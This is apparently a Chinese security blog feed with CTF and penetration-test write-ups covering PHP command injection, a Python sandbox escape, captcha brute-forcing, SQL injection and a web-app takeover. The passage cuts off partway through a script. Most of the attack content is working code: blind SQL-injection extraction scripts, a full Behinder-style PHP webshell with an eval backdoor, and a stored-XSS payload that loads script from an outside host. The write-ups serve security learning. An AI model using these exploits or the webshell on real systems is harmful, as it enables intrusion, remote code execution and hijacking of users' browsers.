&#x27;</span>);<br><span class="hljs-variable">$command</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, fgets(STDIN));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.urlencode(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.urlencode(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>先system(ls /)查看根目录，再system(cat /flag)<br><img src="https://i.loli.net/2021/06/05/tFSkxnciQV714oP.png"></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>解法同上</p><h2 id="fastapi"><a href="#fastapi" class="headerlink" title="fastapi"></a>fastapi</h2><p>本题与ctfshow1024的fastapi一样<br>访问/docs进入交互式文档<br><img src="https://i.loli.net/2021/06/05/dpz36vuSCEKIQPw.png"><br>选择post，提示传入evval<br><img src="https://i.loli.net/2021/06/05/aipALBRZgzCrNJD.png"><br>学习了网上相关题解后，发现可以使用如下payload实现命令执行,先查看根目录：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span>([].__class__.__base__.__subclasses__()[<span class="hljs-number">189</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).__dict__[<span class="hljs-string">&#x27;pop&#x27;</span>+<span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).read())<br></code></pre></div></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/05/ZKw1gVXB5pAP9OW.png"><br>再cat flag</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span>([].__class__.__base__.__subclasses__()[<span class="hljs-number">189</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).__dict__[<span class="hljs-string">&#x27;pop&#x27;</span>+<span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat /f10g&#x27;</span>).read())<br></code></pre></div></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/05/b4X9amMqnFkrTfl.png"></p><h2 id="奇怪的验证码"><a href="#奇怪的验证码" class="headerlink" title="奇怪的验证码"></a>奇怪的验证码</h2><p>打开是个登录界面<br><img src="https://i.loli.net/2021/06/05/JP5H9FL231RdVcy.png"><br>用户名是admin，密码是4位数字，还需要输入验证码<br>由于网页是js加载的，不是静态页面，而python request模块无法获得js加载的网页数据，所以验证码无法直接从返回的源代码中获得<br>先F12查看网络，发现每次网页刷新都会向captcha.php发送请求：<br><img src="https://i.loli.net/2021/06/05/2NeOjFZ1cbkVLJI.png"><br>再看下源码：</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refreshcaptcha</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>  $(<span class="hljs-string">&quot;#expression&quot;</span>).html(<span class="hljs-string">&#x27;arithmetic expression: refreshing....&#x27;</span>);<br>  $.ajax(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&quot;captcha.php&quot;</span>,<span class="hljs-attr">success</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>)</span>&#123;<br>        $(<span class="hljs-string">&quot;#expression&quot;</span>).html(<span class="hljs-string">&#x27;arithmetic expression:&#x27;</span>+result);<br>    &#125;&#125;);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以知道每次页面加载前都会先获取captcha.php中的表达式，再加载新的login.php<br>BP抓包验证一下，在我们放掉第一个请求login.php的包后，紧接着就是请求第二次captcha.php的包：<br><img src="https://i.loli.net/2021/06/05/7gcFL3Z2daxMQJf.png"><br>接下来就可以写脚本了：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://42.193.53.250:18850/captcha.php&#x27;</span><br>login = <span class="hljs-string">&#x27;http://42.193.53.250:18850/login.php&#x27;</span><br>cookie = &#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;28195f48fc7ee61d3f419c74e41a5f7e&#x27;</span>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    password = <span class="hljs-built_in">str</span>(i).rjust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-comment"># print(password)</span><br>    expression = requests.get(url, cookies=cookie).text<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-string">&quot;__import__&quot;</span> <span class="hljs-keyword">in</span> expression:  <span class="hljs-comment"># 靶机上留了后门，有时返回的不是表达式，而是弹出计算器的代码，那就再重传，直到获得合法的表达式</span><br>        expression = requests.get(url, cookies=cookie).text<br><br>    captcha = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">eval</span>(expression)))<br><br>    data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: password, <span class="hljs-string">&#x27;captcha&#x27;</span>: captcha, <span class="hljs-string">&#x27;objectType&#x27;</span>: <span class="hljs-string">&#x27;Window&#x27;</span>&#125;<br>    response = requests.post(login, data=data, cookies=cookie).text<br>    print(<span class="hljs-string">f&#x27;[+] try <span class="hljs-subst">&#123;i&#125;</span> times: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Wrong username or password&#x27;</span> <span class="hljs-keyword">in</span> response:<br>        print(<span class="hljs-string">&#x27;Wrong username or password&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;Verify code wrong or expired!Intrusion detected!password got reset!&quot;</span> <span class="hljs-keyword">in</span> response:<br>        print(<span class="hljs-string">&quot;Verify code wrong or expired!Intrusion detected!password got reset!&quot;</span>)<br>        print(expression)<br>    <span class="hljs-keyword">else</span>:<br>        print(response)<br>        print(<span class="hljs-string">&#x27;[*] password: &#x27;</span>, password)<br>        <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><p>值得注意的是，如果不对返回的验证码表达式进行检查的话，会经常弹出计算器来：<br><img src="https://i.loli.net/2021/06/05/LhHCoDUjMcQfqnT.png"><br>原因在于这是返回的不是算术表达式，而是弹出计算器的代码：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc;mate-calc;gnome-calculator;open /System/Applications/Calculator.app&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>在我们使用eval执行表达式时就出现了弹窗，这就是自己造成的远程执行漏洞吧XD<br>进行爆破后得到密码：<br><img src="https://i.loli.net/2021/06/05/VFaIo3SRkmMc7C6.png"><br>登录后获得flag:<br><img src="https://i.loli.net/2021/06/05/T6c9gvlquaYfQyr.png"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="RE1-ex-fps"><a href="#RE1-ex-fps" class="headerlink" title="[RE1]ex_fps"></a>[RE1]ex_fps</h2><p>是个unity制作的游戏，打满100分就可以拿flag<br>不过可以用ILSpy反编译\assets\bin\Data\Managed目录下的Assembly-Csharp.dll文件，直接就有flag<br><img src="https://i.loli.net/2021/06/05/OuvxJmTQER3W68h.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SCU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web1渗透记录</title>
    <link href="/2021/05/01/web1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/05/01/web1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>登录绕过</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; #</span><br></code></pre></div></td></tr></table></figure><p>直接就进后台了<br>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;../sqlhelper.php&quot;</span>;<br>    <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM admin where name=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$help</span> = <span class="hljs-keyword">new</span> sqlhelper();<br>    <span class="hljs-variable">$res</span>  = <span class="hljs-variable">$help</span>-&gt;execute_dql(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows)&#123;<br>        session_start();<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$res</span>-&gt;fetch_assoc();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;icon&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;icon&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;登录成功&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;用户名密码错误&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到服务器端直接将POST的用户名拼接到sql语句中，造成sql注入<br>然后利用布尔盲注来爆数据库名，先猜一下数据库名长度：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; and length((database())) &gt; 10</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">and</span> length((database())) <span class="hljs-operator">&lt;</span> <span class="hljs-number">20</span><br>admin<span class="hljs-string">&#x27; and length((database())) = 14</span><br></code></pre></div></td></tr></table></figure><p>得到长度是14</p><p>爆库名payload:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://hostname/login/&quot;</span><br>s = requests.Session()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    pwd = <span class="hljs-string">&#x27;123&#x27;</span><br>    database = <span class="hljs-string">&#x27;&#x27;</span><br>    database_payload = <span class="hljs-string">&quot;admin&#x27; and ascii(substr(database(),%d,1))=%d #&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>            payload = database_payload % (i, c)<br>            print(payload)<br>            r = s.post(url, data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: payload, <span class="hljs-string">&#x27;password&#x27;</span>: pwd&#125;).text<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;用户名密码错误&#x27;)&lt;/script&gt;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r:<br>                print(<span class="hljs-built_in">chr</span>(c), end=<span class="hljs-string">&quot;&quot;</span>)<br>                database += <span class="hljs-built_in">chr</span>(c)<br>                <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></div></td></tr></table></figure><p>库名为：<br><img src="https://i.loli.net/2021/05/01/vdpLWqtGBhkeurF.png"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$type</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$type</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>)&#123;<br>                <span class="hljs-variable">$name</span> =<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] ;<br>                <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))<br>                &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件已经存在&#x27;);&lt;/script&gt;&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;assets/images/avatars/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>                    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> sqlhelper();<br>                    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE  admin SET icon=&#x27;<span class="hljs-subst">$name</span>&#x27; WHERE id=<span class="hljs-subst">$_SESSION</span>[id]&quot;</span>;<br>                    <span class="hljs-variable">$helper</span>-&gt;execute_dml(<span class="hljs-variable">$sql</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;不允许上传的类型&#x27;);&lt;/script&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>只对文件类型做了检查，上传图片马抓包改后缀即可</p><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>蚁剑连上后，看一下文件，有几个冰蝎马：</p><p><img src="https://i.loli.net/2021/05/07/f1hQZqeskt3S6wj.png"></p><p><img src="https://i.loli.net/2021/05/07/xFpDB1LduO6yVaA.png"></p><p><img src="https://i.loli.net/2021/05/07/q6bUcfrP7ZYMWOJ.png"></p><p>用冰蝎2.0.1连上即可，密码是pass</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br><span class="hljs-variable">$post</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> C(<span class="hljs-variable">$params</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>看一下info.php源码：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&lt;!--                                                --&gt;<span class="hljs-meta">&lt;?php</span><br>                                <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> sqlhelper();<br>                                <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select address,icon from admin where id=&#x27;<span class="hljs-subst">$_SESSION</span>[id]&#x27;&quot;</span>;<br>                                <span class="hljs-variable">$res</span> = <span class="hljs-variable">$helper</span>-&gt;execute_dql(<span class="hljs-variable">$sql</span>);<br>                                <span class="hljs-variable">$row</span> = <span class="hljs-variable">$res</span>-&gt;fetch_assoc();<br>                                <span class="hljs-comment">//                                                <span class="hljs-meta">?&gt;</span></span><br>                                &lt;form class=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>                                    &lt;div class=&quot;position-relative form-group&quot;&gt;&lt;label for=&quot;examplePassword&quot;<br>                                                                                     class=&quot;&quot;&gt;密码&lt;/label&gt;<br>                                        &lt;input name=<span class="hljs-string">&quot;password&quot;</span> id=<span class="hljs-string">&quot;examplePassword&quot;</span> placeholder=<span class="hljs-string">&quot;修改密码&quot;</span> type=<span class="hljs-string">&quot;password&quot;</span><br>                                               class=&quot;form-control&quot;&gt;&lt;/div&gt;<br>                                    &lt;div class=&quot;position-relative form-group&quot;&gt;&lt;label for=&quot;exampleAddress&quot;<br>                                                                                     class=&quot;&quot;&gt;住址&lt;/label&gt;<br>                                        &lt;input name=<span class="hljs-string">&quot;address&quot;</span> value=<span class="hljs-string">&quot;&lt;?php echo <span class="hljs-subst">$row</span>[&#x27;address&#x27;]; ?&gt;&quot;</span> id=<span class="hljs-string">&quot;exampleAddress&quot;</span><br>                                               placeholder=&quot;家庭住址&quot; type=&quot;text&quot; class=&quot;form-control&quot;&gt;&lt;/div&gt;<br>                                    &lt;div class=&quot;position-relative form-group&quot;&gt;&lt;label for=&quot;exampleFile&quot;<br>                                                                                     class=&quot;&quot;&gt;头像&lt;/label&gt;&lt;br/&gt;<br>                                        &lt;img src=<span class="hljs-string">&quot;assets/images/avatars/&lt;?php echo <span class="hljs-subst">$row</span>[&#x27;icon&#x27;]; ?&gt;&quot;</span>&gt;<br>                                        &lt;input name=&quot;file&quot; id=&quot;exampleFile&quot; type=&quot;file&quot; class=&quot;form-control-file&quot;&gt;<br>                                        &lt;small class=&quot;form-text text-muted&quot;&gt;提交为空则认为不修改&lt;/small&gt;<br>                                    &lt;/div&gt;<br>                                    &lt;button class=&quot;mt-1 btn btn-primary&quot;&gt;Submit&lt;/button&gt;<br></code></pre></div></td></tr></table></figure><p>img标签那里会直接将icon的字段数据与src进行拼接，可以将img标签闭合来实现xss，但是盲注了一下发现icon的字段长度是10，不够插入恶意代码，考虑到我们之前已经通过文件上传漏洞得到了shell，可以直接上传php文件来更改icon字段的长度，并向表中插入xss代码，这里还需注意引号的转义，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;./../../../sqlhelper.php&quot;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;./../../../header.php&quot;</span>;<br><br><span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> sqlhelper();<br><span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;alter table admin modify column icon varchar(2000)&quot;</span>;<br><span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;update admin set icon=&#x27;\&quot;&gt;&lt;script&gt;alert(\&#x27;Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.\&#x27;)&lt;/script&gt; //&#x27; where id=1;&quot;</span>;<br><span class="hljs-variable">$xss</span> = <span class="hljs-string">&#x27;update admin set icon=&quot;\&quot;&gt;&lt;img src=x onerror=s=createElement(\&quot;script\&quot;);body.appendChild(s);s.src=\&quot;http://xss8.cc/z2Yx\&quot;;&gt;// &quot; WHERE id=1;&#x27;</span>;<br><br><span class="hljs-variable">$res1</span> = <span class="hljs-variable">$helper</span>-&gt;execute_dml(<span class="hljs-variable">$sql1</span>);<br><span class="hljs-comment">// $res2 = 